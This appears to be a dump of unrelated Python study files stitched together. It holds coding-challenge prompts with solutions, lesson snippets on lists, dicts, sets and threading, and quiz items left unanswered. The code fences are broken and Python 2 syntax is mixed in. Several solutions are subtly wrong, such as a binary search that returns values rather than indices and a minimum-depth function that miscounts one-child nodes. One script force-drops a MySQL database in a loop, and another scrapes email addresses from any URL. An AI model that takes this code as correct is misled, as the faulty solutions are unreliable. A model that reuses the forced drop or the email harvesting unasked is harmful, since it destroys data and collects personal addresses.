empty = ()
print(empty)

single = (1,)
print(single)

single = ("a",)
print(single)

def binary_search(arr, target):
    if not arr:
        return -1
    if len(arr) == 1 and arr[0] == target:
        return arr[0]
    if len(arr) == 1 and arr[0] != target:
        return -1
    low = 0
    high = len(arr) - 1
    mid = (low + high) // 2

    if arr[mid] > target:
        return binary_search(arr[:mid], target)
    else:
        return binary_search(arr[mid + 1 :], target)
````

```py

Select the correct ordering of steps for a postorder depth-first traversal:



A - 1. Visit node
    2. Go to the right subtree
    3. got to the left subtree

B - 1. Go to the right subtree
    2. Go to the left subtree
    3. Visit node

C - 1. Go to the left subtree
    2. Go to the right subtree
    3. Visit node

D - 1. Go to the right subtree
    2. Visit node
    3. Go to the left subtree

E - 1. Go to the left subtree
    2. Visit node
    3. Go to the right subtree

F - 1. Visit node
    2. Go to the left subtree
    3. Go to the right subtree




    answer is :
```

```py

import threading
from time import sleep


class ValueHolder:
    def __init__(self):
        self._value = 0

    def increment(self):
        v = self._value
        v = v + 1
        sleep(0.1)
        self._value = v

    @property
    def value(self):
        return self._value


vh = ValueHolder()

thread1 = threading.Thread(target=vh.increment, daemon=True)
thread2 = threading.Thread(target=vh.increment, daemon=True)

thread1.start()
thread2.start()
print("Threads all started.")
thread1.join()
thread2.join()
print(vh.value)
print("Done with this.")

# For the exercise, look up the methods and functions that are available for use
# with Python lists.

x = [1, 2, 3]
y = [8, 9, 10]

# For the following, DO NOT USE AN ASSIGNMENT (=).

# Change x so that it is [1, 2, 3, 4]
x.append(4)
print(x)

# Using y, change x so that it is [1, 2, 3, 4, 8, 9, 10]
x.extend(y)
print(x)

# Change x so that it is [1, 2, 3, 4, 9, 10]
x.remove(8)
print(x)

# Change x so that it is [1, 2, 3, 4, 9, 99, 10]
x.insert(5, 99)
print(x)

# Print the length of list x
print(len(x))

# Print all the values in x multiplied by 1000
for e in x:
    print(e * 1000)

def dict_raise_on_duplicates(ordered_pairs):
    """reject duplicate keys"""
    my_dict = dict()
    for key, values in ordered_pairs:
        if key in my_dict:
            raise ValueError("Duplicate key: {}".format(key))
        else:
            my_dict[key] = values
    return my_dict
```

```py
You are given a binary tree and you are asked to write a function that finds its minimum depth. The minimum depth can be defined as the number of nodes along the shortest path from the root down to the nearest leaf node. As a reminder, a leaf node is a node with no children.

Example:
Given the binary tree [5,7,22,None,None,17,9],

    5
   / \
  7  22
    /  \
   17   9
your function should return its minimum depth = 2.

[execution time limit] 4 seconds (py3)

[input] tree.integer root

[output] integer
```

```py
#
# Binary trees are already defined with this interface:
# class Tree(object):
#   def __init__(self, x):
#     self.value = x
#     self.left = None
#     self.right = None
def minimumDepthBinaryTree(root):

    if root is None:
        return 0
    else:
        return 1 + min(
            minimumDepthBinaryTree(root.left), minimumDepthBinaryTree(root.right)
        )

def quicksort(array):
    if len(array) < 2:
        # base case, arrays with 0 or 1 element are already "sorted"
        return array
    else:
        # recursive case
        pivot = array[0]
        # sub-array of all the elements less than the pivot
        less = [i for i in array[1:] if i <= pivot]
        # sub-array of all the elements greater than the pivot
        greater = [i for i in array[1:] if i > pivot]
        return quicksort(less) + [pivot] + quicksort(greater)


print(quicksort([10, 5, 2, 3]))

# Lexicographically Smallest String

# Lexicographically smallest string formed by removing at most
# one character.

# Example 1:  Input: "abczd"   |   Output: "abcd"

# time complexity:  O(n)
# space complexity:  O(1)


def lexi_smallest(s):
    length = len(s)
    length_one_short = length - 1

    for x in range(length_one_short):
        i_one_short = x - 1
        x_one_long = x + 1
        if s[x] > s[x_one_long]:
            return s[:x] + s[x_one_long:]
    return s[:-1]


# abcd
print(lexi_smallest("abczd"))

# Assignment Operators in Python
# - Increment (no postfix/prefix)
# - Powers and Integer division
# - Big Numbers
# - Stopping a runaway process (control+c)

i = 1
# i++ does not exist in Python, we have to use i += 1
i += 1
print(i)  # > 2

i += 4
print(i)  # > 6

i **= 2
print(i)  # > 36

i //= 10
print(i)  # > 3

i *= 10 ** 200
print(i)  # > 3 followed by 200 0s (all written out)

print(float(i))  # > 3e+200 (floats are written in scientific notation)

i = 3
i **= 10 ** 200
print(i)  # runaway process! control+c triggers a KeyboardInterrupt to stop it

# Ranges
# - declare
# - loops

nums = range(10)
print(nums)
print(list(nums))

counters = range(1, 11)
print(list(counters))

fives = range(0, 51, 5)
print(list(fives))

test = range(51, 5)
print(list(test))

items = ["a", "b", "c"]
for i in range(len(items)):
    print(i, items[i])

for i in range(1, 10, 2):
    print(i)

'''
 The string "PAYPALISHIRING" is written in a zigzag pattern on a given number of rows like this: (you may want to display this pattern in a fixed font for better legibility)

 P   A   H   N
 A P L S I I G
 Y   I   R

 And then read line by line: "PAHNAPLSIIGYIR"
'''

class Solution(object):
    def convert(self, s, numRows):
        """
        :type s: str
        :type numRows: int
        :rtype: str
        """

        if numRows == 1:
         return s

        result = ["" for _ in range(numRows)]
        row, down = 0, 1
        for char in s:
         result[row] += char

         if row == numRows - 1:
          down = 0
         if row == 0:
          down = 1

         if down:
          row += 1
         else:
          row -= 1
        final_string = ""
        for value in result:
         final_string += value
        return final_string

print Solution().convert("PAYPALISHIRING",3)
import threading
from time import sleep


class ValueHolder:
    def __init__(self):
        self._value = 0
        self._lock = threading.Lock()

    # Using Lock.acquire() and Lock.release()
    def increment(self):
        self._lock.acquire()
        # BEGIN CRITICAL SECTION
        v = self._value
        v = v + 1
        sleep(0.1)
        self._value = v
        # END CRITICAL SECTION
        self._lock.release()

    # Using the context manager
    def increment(self):
        with self._lock:
            # BEGIN CRITICAL SECTION
            v = self._value
            v = v + 1
            sleep(0.1)
            self._value = v
            # END CRITICAL SECTION

    @property
    def value(self):
        return self._value


vh = ValueHolder()

thread1 = threading.Thread(target=vh.increment, daemon=True)
thread2 = threading.Thread(target=vh.increment, daemon=True)

thread1.start()
thread2.start()
print("Threads all started.")
thread1.join()
thread2.join()
print(vh.value)
print("Done with this.")
```

```py
What data structure would you use in order to write an interative depth-first traversal method?

A - Heap
B - Binary Search Tree
C - Stack
D - Queue


answer is :





```

```py

```

```py
ExecutionTime

This class is used for timing execution of code.

For example:

    timer = ExecutionTime()
    print 'Hello world!'
    print 'Finished in {} seconds.'.format(timer.duration())
```

```py


import time
import random


class ExecutionTime:
    def __init__(self):
        self.start_time = time.time()

    def duration(self):
        return time.time() - self.start_time


# ---- run code ---- #


timer = ExecutionTime()
sample_list = list()
my_list = [random.randint(1, 888898) for num in range(1, 1000000) if num % 2 == 0]
print("Finished in {} seconds.".format(timer.duration()))

def find_max(arr):
    if len(arr) == 2:
        return arr[0] if arr[0] > arr[1] else arr[1]
    sub_max = find_max(arr[1:])
    return arr[0] if arr[0] > sub_max else sub_max

def almostIncreasingSequence(sequence):
    i = 0
    while i < len(sequence) - 1:
        if not sequence[i] < sequence[i + 1]:
            if increasingSequence(
                sequence[:i] + sequence[i + 1 :]
            ) or increasingSequence(sequence[: i + 1] + sequence[i + 2 :]):
                return True
            else:
                return False
        i += 1
    return True


def increasingSequence(sequence):
    for i in range(len(sequence) - 1):
        if not sequence[i] < sequence[i + 1]:
            return False
    return True

# Dictionaries
# - mapping iterable
# - declare
# - add/remove items
# - loop through all items
# - dict()
# - zip()
# - dir()
# - duck typing revisited

book = {
    "title": "Goodnight Moon",
    "ratings": 7492,
    "stars": 4.8,
    "author": {"firstName": "Margaret", "lastName": "Wise Brown"},
    "images": ["goodnight1.png", "goodnight2.png"],
}
print(book)

print(len(book))

del book["stars"]
print(book)

book["stars"] = 4.8
print(book)

for i in book:
    print(i, book[i])

# Meaning of Truth in Python
# - numeric types equivalent, but not strings
# - conditionals (if, elif, else)
# - truth equivalence

a = 1
b = 1.0
c = "1"

# print(a == b)
# print(a == c)
# print(b == c)

# if (a == c):
#     print("match")
# elif (a == b):
#     print("a matches b")
# else:
#     print("not a match")

a = []
# Falsy Values:
# 0, 0.0, 0j (complex number)
# ''
# False
# None
# []
# ()
# {}
# set()
# range(0)

if a:
    print(f"{a} is true")
else:
    print(f"{a} is false")

def almostIncreasingSequence(sequence):
    i = 0
    while i < len(sequence) - 1:
        if not sequence[i] < sequence[i + 1]:
            if increasingSequence(
                sequence[:i] + sequence[i + 1 :]
            ) or increasingSequence(sequence[: i + 1] + sequence[i + 2 :]):
                return True
            else:
                return False
        i += 1
    return True


def increasingSequence(sequence):
    for i in range(len(sequence) - 1):
        if not sequence[i] < sequence[i + 1]:
            return False
    return True

import os
import time
import numpy

# temp file for benchmarking


def timeit(method):
    def timed(*args, **kw):
        ts = time.time()

        result = method(*args, **kw)
        te = time.time()
        all_times.append(te - ts)

        print(all_times)
        print(numpy.mean(all_times))
        return result

    return timed


def create_new_db():
    os.system("mysqladmin -u root drop DATABASE_NAME -f")
    os.system("mysqladmin -u root create DATABASE_NAME -f")
    os.system("./manage.py syncdb")
    os.system("./manage.py migrate")


@timeit
def load_new_perms():
    os.system("./manage.py LOAD_PERMS_COMMAND")


if __name__ == "__main__":
    n = 0
    all_times = list()
    while n < 10:
        create_new_db()
        load_new_perms()
        n += 1
```

```py

You are given a binary tree. Write a function that returns the binary tree's node values using an in-order traversal.

Example:
Input: [2,None,3,4]

   2
    \
     3
    /
   4
Output: [2,4,3]

[execution time limit] 4 seconds (py3)

[input] tree.integer root

[output] array.integer
```

```py
#
# Binary trees are already defined with this interface:
# class Tree(object):
#   def __init__(self, x):
#     self.value = x
#     self.left = None
#     self.right = None
def binaryTreeInOrderTraversal(root):
    # define some helper function that we will use inside our traversal code
    def inorder_helper(root, res):
        # go to till you find the leaf
        if root is None:
            return
        inorder_helper(root.left, res)
        res.append(root.value)
        inorder_helper(root.right, res)

    # store our result
    result = []
    # pass in out root and result to the helper function
    inorder_helper(root, result)
    # after all of the calls to our helper fn are finished we can return our results
    return result

import threading
from time import sleep

lock1 = threading.Lock()
lock2 = threading.Lock()


def func1():
    with lock1:
        # sleep(0.1)
        with lock2:
            print("func1")


def func2():
    with lock2:
        # sleep(0.1)
        with lock1:
            print("func2")


thread1 = threading.Thread(target=func1)
thread2 = threading.Thread(target=func2)
thread1.start()
thread2.start()
```

````py
Python exposes a terse and intuitive syntax for performing
slicing on lists and strings. This makes it easy to reference
only a portion of a list or string.

This Stack Overflow answer provides a brief but thorough
overview: https://stackoverflow.com/a/509295

Use Python's slice syntax to achieve the following:```


```py

a = [2, 4, 1, 7, 9, 6]

# Output the second element: 4:
print(a[1])

# Output the second-to-last element: 9
print(a[-2])

# Output the last three elements in the array: [7, 9, 6]
print(a[-3:])

# Output the two middle elements in the array: [1, 7]
print(a[2:4])

# Output every element except the first one: [4, 1, 7, 9, 6]
print(a[1:])

# Output every element except the last one: [2, 4, 1, 7, 9]
print(a[:-1])

# For string s...

s = "Hello, world!"

# Output just the 8th-12th characters: "world"
print(s[7:12])

# While loops follow a very similar structure to JavaScript
i = 0
while i < 5:
    print(f"{i+1}. Hello, world.")
    i += 1

# The 'continue' keyword goes to the next loop
# The 'break' keyword exits out of the loop completely
i = 0
while True:
    print(f"{i+1}. Hello, world.")
    if i < 4:
        i += 1
        continue
    print("You've printed 5 times. Goodbye.")
    break

def matrixElementsSum(matrix):
    if len(matrix) > 1:
        for row in range(1, len(matrix)):
            for room in range(len(matrix[row])):
                if matrix[row - 1][room] == 0:
                    matrix[row][room] = 0
    sum = 0
    for row in matrix:
        for room in row:
            sum += room
    return sum

# Dictionaries
# - mapping iterable
# - declare
# - add/remove items
# - loop through all items
# - dict()
# - zip()
# - dir()
# - duck typing revisited

pond = dict(depth=10, area="210 square feet", fish=["Mary", "Bob", "Billy"])
print(pond)

alligator = dict(
    [
        ("lifespan", 50),
        ("length", 3.4),
        ("lengthUnits", "m"),
        ("species", ["American Alligator", "Chinese Alligator"]),
        (
            "funFact",
            "As an alligator's teeth are worn down, they are replaced. "
            + "An alligator can go through 3,000 teeth in a lifetime.",
        ),
    ]
)
print(alligator)

keys = ["name", "home runs", "strikeouts", "rbi"]
values = ["Babe Ruth", 7214, 1330, 2214]
player = dict(zip(keys, values))
print(player)

print(dir(player))

# Identity vs. Equality
# - is vs. ==
# - working with literals
# - isinstance()

a = 1
b = 1.0
c = "1"

print(a == b)
print(a is b)

print(c == "1")
print(c is "1")

print(b == 1)
print(b is 1)

print(b == 1 and isinstance(b, int))
print(a == 1 and isinstance(a, int))

# d = 100000000000000000000000000000000
d = float(10)
e = float(10)

print(id(d))
print(id(e))
print(d == e)
print(d is e)

b = int(b)
print(b)
print(b == 1 and isinstance(b, int))

print(a)
print(float(a))
print(str(a))

print(str(a) is c)
print(str(a) == c)

def matrixElementsSum(matrix):
    if len(matrix) > 1:
        for row in range(1, len(matrix)):
            for room in range(len(matrix[row])):
                if matrix[row - 1][room] == 0:
                    matrix[row][room] = 0
    sum = 0
    for row in matrix:
        for room in row:
            sum += room
    return sum

import requests
import re

# get url
url = input("Enter a URL (include `http://`): ")

# connect to the url
website = requests.get(url)

# read html
html = website.text

# use re.findall to grab all the links
links = re.findall('"((http|ftp)s?://.*?)"', html)
emails = re.findall("([\w\.,]+@[\w\.,]+\.\w+)", html)


# print the number of links in the list
print("\nFound {} links".format(len(links)))
for email in emails:
    print(email)

def allLongestStrings(inputArray):
    length = max([len(word) for word in inputArray])
    result = [word for word in inputArray if len(word) == length]
    return result

# Make an xor function
# Truth table
# | left  | right | Result |
# |-------|-------|--------|
# | True  | True  | False  |
# | True  | False | True   |
# | False | True  | True   |
# | False | False | False  |
# def xor(left, right):
#   return left != right

xor = lambda left, right: left != right

print(xor(True, True))  # > False
print(xor(True, False))  # > True
print(xor(False, True))  # > True
print(xor(False, False))  # > False


def print_powers_of(base, exp=1):
    i = 1
    while i <= exp:
        print(base ** i)
        i += 1


# We are not hoisting the function declaration, we need to invoke after declared
print_powers_of(15)
print_powers_of(exp=6, base=7)
print_powers_of(2, 5)
print_powers_of(3, 5)
print_powers_of(10, 5)

if True:
    x = 10

print(x)
print(i)

# Sets
# - declare
# - union, intersection, symmetric_difference, difference
# - Examples
# -- unique tags
# -- users taking two actions

# a = {1, 2, 3}
# b = {3, 4, 5}
# print(a)
# print(b)

# print(a | b)
# print(a & b)
# print(a - b)
# print(b - a)
# print(a ^ b)
# # print(a + b)

# a = set('banana')
# b = set('scarab')
# print(a)
# print(b)

# print(a.union(b))
# print(a.intersection(b))
# print(a.symmetric_difference(b))
# print(a.difference(b))
# print(b.difference(a))

basket = ["apple", "banana", "apple", "orange", "pear", "apple", "banana"]
print(basket)
print(set(basket))

def allLongestStrings(inputArray):
    length = max([len(word) for word in inputArray])
    result = [word for word in inputArray if len(word) == length]
    return result

import requests
import re

try:
    from urllib.parse import urljoin
except ImportError:
    from urlparse import urljoin

# regex
link_re = re.compile(r'href="(.*?)"')


def crawl(url):

    req = requests.get(url)

    # Check if successful
    if req.status_code != 200:
        return []

    # Find links
    links = link_re.findall(req.text)

    print("\nFound {} links".format(len(links)))

    # Search links for emails
    for link in links:

        # Get an absolute URL for a link
        link = urljoin(url, link)

        print(link)


if __name__ == "__main__":
    crawl("https://lambda-w-1-notes.netlify.app/")

import math

# Inverse Square Root is 1 over the square root of a number


inv_sqrt = {}


def build_lookup_table():
    # expensive to do the first build
    global inv_sqrt

    for i in range(1, 1000001):
        inv_sqrt[i] = 1 / math.sqrt(i)


print(inv_sqrt)

build_lookup_table()

print(inv_sqrt)
# Fast to just look up the answer
print(inv_sqrt[3])
print(inv_sqrt[982])
print(inv_sqrt[234])
````

````py
time: O(n)
space: O(n)```


```py


class Solution(object):
    def twoSum(self, nums, target):
        """
        :type nums: List[int]
        :type target: int
        :rtype: List[int]
        """
        record = {}
        for i in range(len(nums)):
            if nums[i] in record:
                return [record[nums[i]], i]
            record[target - nums[i]] = i
        return []

def commonCharacterCount(s1, s2):
    count = 0
    word2 = list(s2)
    for letter in s1:
        if letter in word2:
            word2.remove(letter)
            count += 1
    return count

# Day of Week That Is k Days Later

# Days of the week are represented as three-letter strings.
# "Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"
# Write a javaScript function solution that, given a string
# S representing the day of the week and an integer K
# (between 0 and 500), returns the day of the week that
# is K days later.

# For example, given S = "Wed" and K = 2, the function
# should return "Fri".
# Given S = "Sat" and K = 23, the function should return
# "Mon".


# time complexity:  O(1)
# space complexity:  O(1)


def k_days_later(s, k):
    days_of_week = ["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"]
    remainder = k % 7
    s_index = days_of_week.index(s)
    move_forward = remainder + s_index
    if move_forward < 7:
        return days_of_week[move_forward]
    else:
        correct_day_index = move_forward - 7
        return days_of_week[correct_day_index]


# 0
print(k_days_later("Wed", 2))
print("----")
# 2
print(k_days_later("Sat", 23))
print("----")
print(k_days_later("Sat", 300))

def greeting_maker(salutation):
    print(salutation)

    def greeting(name):
        return f"{salutation} {name}"

    return greeting


# print(salutation) # Error, salutation is not defined at this scope

hello = greeting_maker("Hello")
hiya = greeting_maker("Hiya")

print(hello("Monica"))
print(hello("Raja"))

print(hiya("Raul"))
print(hiya("Tariq"))

# Sets
# - declare
# - union, intersection, symmetric_difference, difference
# - Examples
# -- unique tags
# -- users taking two actions

purchasingEmails = ("bob@gmail.com", "sam@yahoo.com", "riley@rileymail.org")
helpEmails = ("jo@josbilling.com", "bob@gmail.com", "sam@yahoo.com")

print("Users making a purchase and also calling help desk")
print(set(purchasingEmails) & set(helpEmails))

# Definition for a binary tree node.
class TreeNode:
    def __init__(self, x):
        self.val = x
        self.left = None
        self.right = None


class Solution:
    def isSameTree(self, p, q):
        """
        :type p: TreeNode
        :type q: TreeNode
        :rtype: bool
        """
        if not p or not q:
            return p == q
        if p.val != q.val:
            return False
        return self.isSameTree(p.left, q.left) and self.isSameTree(p.right, q.right)
````

````py
Given an array A of strings made only from lowercase letters, return a list of all characters that show up in all strings within the list (including duplicates).  For example, if a character occurs 3 times in all strings but not 4 times, you need to include that character three times in the final answer.

You may return the answer in any order.



Example 1:

Input: ["bella","label","roller"]
Output: ["e","l","l"]
Example 2:

Input: ["cool","lock","cook"]
Output: ["c","o"]```


```py


class Solution(object):
    def commonChars(self, A):
        """
        :type A: List[str]
        :rtype: List[str]
        """
        char_map = {}
        for char in A[0]:
            if char in char_map:
                char_map[char] += 1
            else:
                char_map[char] = 1

        int_map = {}
        for index in range(1, len(A)):
            for char in char_map.keys():
                if char in A[index]:
                    char_count = min(A[index].count(char), char_map[char])
                    char_map[char] = char_count
                else:
                    del char_map[char]

        result = []
        for key, value in char_map.items():
            result.extend([key] * value)

        return result

class Solution:
    def longestOnes(self, A: List[int], K: int) -> int:
        i = 0
        for j in range(len(A)):
            K -= 1 - A[j]
            if K < 0:
                K += 1 - A[i]
                i += 1
        return j - i + 1
````

````py
Given an array A of integers, we must modify the array in the following way: we choose an i and replace A[i] with -A[i], and we repeat this process K times in total.  (We may choose the same index i multiple times.)

Return the largest possible sum of the array after modifying it in this way.



Example 1:

Input: A = [4,2,3], K = 1
Output: 5
Explanation: Choose indices (1,) and A becomes [4,-2,3].
Example 2:

Input: A = [3,-1,0,2], K = 3
Output: 6
Explanation: Choose indices (1, 2, 2) and A becomes [3,1,0,2].
Example 3:

Input: A = [2,-3,-1,5,-4], K = 2
Output: 13
Explanation: Choose indices (1, 4) and A becomes [2,3,-1,5,4].


Note:

1 <= A.length <= 10000
1 <= K <= 10000
-100 <= A[i] <= 100```


```py


class Solution(object):
    def largestSumAfterKNegations(self, A, K):
        """
        :type A: List[int]
        :type K: int
        :rtype: int
        """
        A.sort()
        index = 0
        while K > 0:
            if A[index] < 0:
                A[index] *= -1
                if A[index + 1] < A[index] and index < len(A) - 1:
                    index += 1
            else:
                A[index] *= -1
            K -= 1
        return sum(A)
````

````py
Return the root node of a binary search tree that matches the given preorder traversal.

(Recall that a binary search tree is a binary tree where for every node, any descendant of node.left has a value < node.val, and any descendant of node.right has a value > node.val.  Also recall that a preorder traversal displays the value of the node first, then traverses node.left, then traverses node.right.)```


```py

# Definition for a binary tree node.
# class TreeNode(object):
#     def __init__(self, x):
#         self.val = x
#         self.left = None
#         self.right = None


class Solution(object):
    def bstFromPreorder(self, preorder):
        """
        :type preorder: List[int]
        :rtype: TreeNode
        """
        root = TreeNode(preorder[0])
        stack = [root]
        for index in range(1, len(preorder)):
            new_node = TreeNode(preorder[index])
            if new_node.val < stack[-1].val:
                stack[-1].left = new_node
            else:
                parent = None
                while stack and new_node.val > stack[-1].val:
                    parent = stack.pop()
                parent.right = new_node
            stack.append(new_node)
        return root

class Solution:
    def bitwiseComplement(self, N: int) -> int:
        X = 1
        while N > X:
            X = X * 2 + 1
        return X - N

'''
Given an array A of integers, return true if and only if we can partition the array into three non-empty parts with equal sums.

Formally, we can partition the array if we can find indexes i+1 < j with (A[0] + A[1] + ... + A[i] == A[i+1] + A[i+2] + ... + A[j-1] == A[j] + A[j-1] + ... + A[A.length - 1])



Example 1:

Input: [0,2,1,-6,6,-7,9,1,2,0,1]
Output: true
Explanation: 0 + 2 + 1 = -6 + 6 - 7 + 9 + 1 = 2 + 0 + 1
Example 2:

Input: [0,2,1,-6,6,7,9,-1,2,0,1]
Output: false
Example 3:

Input: [3,3,6,5,-2,2,5,1,-9,4]
Output: true
Explanation: 3 + 3 = 6 = 5 - 2 + 2 + 5 + 1 - 9 + 4


Note:

3 <= A.length <= 50000
-10000 <= A[i] <= 10000
'''

class Solution(object):
    def canThreePartsEqualSum(self, A):
        """
        :type A: List[int]
        :rtype: bool
        """
        total_sum = 0
        for val in A:
            total_sum += val

        if(total_sum%3 != 0):
            return False

        curr_sum, groups = 0, 0
        for val in A:
            curr_sum += val
            if curr_sum == total_sum/3:
                curr_sum = 0
                groups +=1
        print groups
        return groups == 3

````

````py
Given an array A of positive integers, A[i] represents the value of the i-th sightseeing spot, and two sightseeing spots i and j have distance j - i between them.

The score of a pair (i < j) of sightseeing spots is (A[i] + A[j] + i - j) : the sum of the values of the sightseeing spots, minus the distance between them.

Return the maximum score of a pair of sightseeing spots.



Example 1:

Input: [8,1,5,2,6]
Output: 11
Explanation: i = 0, j = 2, A[i] + A[j] + i - j = 8 + 5 + 0 - 2 = 11


Note:

2 <= A.length <= 50000
1 <= A[i] <= 1000```


```py


class Solution(object):
    def maxScoreSightseeingPair(self, A):
        """
        :type A: List[int]
        :rtype: int
        """
        prev_best, result = 0, 0
        for index in range(0, len(A)):
            result = max(result, A[index] - index + prev_best)
            prev_best = max(prev_best, A[index] + index)
        return result
````

````py
Given a positive integer K, you need find the smallest positive integer N such that N is divisible by K, and N only contains the digit 1.

Return the length of N.  If there is no such N, return -1.



Example 1:

Input: 1
Output: 1
Explanation: The smallest answer is N = 1, which has length 1.
Example 2:

Input: 2
Output: -1
Explanation: There is no such positive integer N divisible by 2.
Example 3:

Input: 3
Output: 3
Explanation: The smallest answer is N = 111, which has length 3.```


```py


class Solution(object):
    def smallestRepunitDivByK(self, K):
        """
        :type K: int
        :rtype: int
        """
        length, value = 0, 0
        for no_one in range(100000):
            value = (10 * value + 1) % K
            length += 1
            if value == 0:
                return length
        return -1
````

````py
Given a binary string S (a string consisting only of '0' and '1's) and a positive integer N, return true if and only if for every integer X from 1 to N, the binary representation of X is a substring of S.



Example 1:

Input: S = "0110", N = 3
Output: true
Example 2:

Input: S = "0110", N = 4
Output: false


Note:

1 <= S.length <= 1000
1 <= N <= 10^9```


```py


class Solution(object):
    def queryString(self, S, N):
        """
        :type S: str
        :type N: int
        :rtype: bool
        """
        for num in range(1, N + 1):
            binary_str = ""
            while num != 0:
                binary_str += str(num % 2)
                num /= 2
            reversed_str = binary_str[::-1]

            if reversed_str not in S:
                return False
        return True
````

````py
Given a number N, return a string consisting of "0"s and "1"s that represents its value in base -2 (negative two).

The returned string must have no leading zeroes, unless the string is "0".


Example 1:

Input: 2
Output: "110"
Explantion: (-2) ^ 2 + (-2) ^ 1 = 2
Example 2:

Input: 3
Output: "111"
Explantion: (-2) ^ 2 + (-2) ^ 1 + (-2) ^ 0 = 3

Example 3:

Input: 4
Output: "100"
Explantion: (-2) ^ 2 = 4


Note:

0 <= N <= 10^9```


```py


class Solution(object):
    def baseNeg2(self, N):
        """
        :type N: int
        :rtype: str
        """
        if N == 0:
            digits = ["0"]
        else:
            digits = []
            while N != 0:
                N, remainder = divmod(N, -2)
                if remainder < 0:
                    N, remainder = N + 1, remainder + 2
                digits.append(str(remainder))
        return "".join(digits[::-1])
````

````py
Given an array A of 0s and 1s, consider N_i: the i-th subarray from A[0] to A[i] interpreted as a binary number (from most-significant-bit to least-significant-bit.)

Return a list of booleans answer, where answer[i] is true if and only if N_i is divisible by 5.

Example 1:

Input: [0,1,1]
Output: [true,false,false]
Explanation:
The input numbers in binary are 0, 01, 011; which are 0, 1, and 3 in base-10.  Only the first number is divisible by 5, so answer[0] is true.
Example 2:

Input: [1,1,1]
Output: [false,false,false]

Note:

1 <= A.length <= 30000
A[i] is 0 or 1```


```py


class Solution(object):
    def prefixesDivBy5(self, A):
        """
        :type A: List[int]
        :rtype: List[bool]
        """
        result = []
        if not A:
            return []
        str_bin = ""
        for val in A:
            str_bin += str(val)
            if int(str_bin, 2) % 5 == 0:
                result.append(True)
            else:
                result.append(False)
        return result

class Solution:
    def removeOuterParentheses(self, S: str) -> str:
        stack, result = [], ""
        for i in range(len(S)):
            if S[i] == "(":
                stack.append(i)
            elif S[i] == ")":
                if len(stack) == 1:
                    result += S[stack.pop() + 1 : i]
                else:
                    stack.pop()
        return result

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, val=0, left=None, right=None):
#         self.val = val
#         self.left = left
#         self.right = right
class Solution:
    def sumRootToLeaf(self, root: TreeNode) -> int:
        def dfs(node, val):
            if not node:
                return 0
            val = val * 2 + node.val
            if not node.left and not node.right:
                return val
            return dfs(node.left, val) + dfs(node.right, val)

        return dfs(root, 0)
````

````py
Alice and Bob take turns playing a game, with Alice starting first.

Initially, there is a number N on the chalkboard.  On each player's turn, that player makes a move consisting of:

Choosing any x with 0 < x < N and N % x == 0.
Replacing the number N on the chalkboard with N - x.
Also, if a player cannot make a move, they lose the game.

Return True if and only if Alice wins the game, assuming both players play optimally.



Example 1:

Input: 2
Output: true
Explanation: Alice chooses 1, and Bob has no more moves.
Example 2:

Input: 3
Output: false
Explanation: Alice chooses 1, Bob chooses 1, and Alice has no more moves.


Note:

1 <= N <= 1000```


```py


class Solution(object):
    def divisorGame(self, N):
        """
        :type N: int
        :rtype: bool
        """
        if N == 0:
            return False

        move = 0
        while N > 1:
            for num in range(1, N):
                if N % num == 0:
                    N -= num
                    move += 1
                    break
        # print move
        if move % 2:
            return True
        return False

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, val=0, left=None, right=None):
#         self.val = val
#         self.left = left
#         self.right = right
class Solution:
    def maxAncestorDiff(self, root: TreeNode) -> int:
        def dfs(node, min_val, max_val):
            if not node:
                return max_val - min_val
            max_val = max(node.val, max_val)
            min_val = min(node.val, min_val)
            return max(
                dfs(node.left, min_val, max_val), dfs(node.right, min_val, max_val)
            )

        return dfs(root, root.val, root.val)
````

````py
Given an array A of integers, return the length of the longest arithmetic subsequence in A.

Recall that a subsequence of A is a list A[i_1], A[i_2], ..., A[i_k] with 0 <= i_1 < i_2 < ... < i_k <= A.length - 1, and that a sequence B is arithmetic if B[i+1] - B[i] are all the same value (for 0 <= i < B.length - 1).



Example 1:

Input: [3,6,9,12]
Output: 4
Explanation:
The whole array is an arithmetic sequence with steps of length = 3.
Example 2:

Input: [9,4,7,2,10]
Output: 3
Explanation:
The longest arithmetic subsequence is [4,7,10].```


```py


class Solution(object):
    def longestArithSeqLength(self, A):
        """
        :type A: List[int]
        :rtype: int
        """
        from collections import defaultdict

        dp = defaultdict(int)
        # print dp
        for index_i in range(len(A)):
            for index_j in range(index_i):
                diff = A[index_i] - A[index_j]
                dp[(index_i, diff)] = max(dp[(index_i, diff)], dp[(index_j, diff)] + 1)
                # print dp
        return max(dp.itervalues()) + 1
````

````py
There are 2N people a company is planning to interview. The cost of flying the i-th person to city A is costs[i][0], and the cost of flying the i-th person to city B is costs[i][1].

Return the minimum cost to fly every person to a city such that exactly N people arrive in each city.



Example 1:

Input: [[10,20],[30,200],[400,50],[30,20]]
Output: 110
Explanation:
The first person goes to city A for a cost of 10.
The second person goes to city A for a cost of 30.
The third person goes to city B for a cost of 50.
The fourth person goes to city B for a cost of 20.

The total minimum cost is 10 + 30 + 50 + 20 = 110 to have half the people interviewing in each city.


Note:

1 <= costs.length <= 100
It is guaranteed that costs.length is even.
1 <= costs[i][0], costs[i][1] <= 1000```


```py


class Solution(object):
    def twoCitySchedCost(self, costs):
        """
        :type costs: List[List[int]]
        :rtype: int
        """
        result = 0
        costs = sorted(costs, key=lambda x: x[0] - x[1])
        for index in range(len(costs)):
            if index < len(costs) // 2:
                result += costs[index][0]
            else:
                result += costs[index][1]
        return result

class TrieNode:
    def __init__(self):
        self.children = {}
        self.is_word = False


class Trie:
    def __init__(self):
        self.root = TrieNode()

    def add(self, word):
        node = self.root
        for c in word:
            node = node.children.setdefault(c, TrieNode())
        node.is_word = True


from collections import deque


class StreamChecker:
    def __init__(self, words: List[str]):
        self.trie = Trie()
        self.q = deque()
        for word in words:
            self.trie.add(word[::-1])

    def query(self, letter: str) -> bool:
        node = self.trie.root
        self.q.appendleft(letter)
        for c in self.q:
            if c not in node.children:
                return False
            node = node.children[c]
            if node.is_word:
                return True
        return False


# Your StreamChecker object will be instantiated and called as such:
# obj = StreamChecker(words)
# param_1 = obj.query(letter)
````

````py
A boomerang is a set of 3 points that are all distinct and not in a straight line.

Given a list of three points in the plane, return whether these points are a boomerang.



Example 1:

Input: [[1,1],[2,3],[3,2]]
Output: true
Example 2:

Input: [[1,1],[2,2],[3,3]]
Output: false


Note:

points.length == 3
points[i].length == 2
0 <= points[i][j] <= 100```

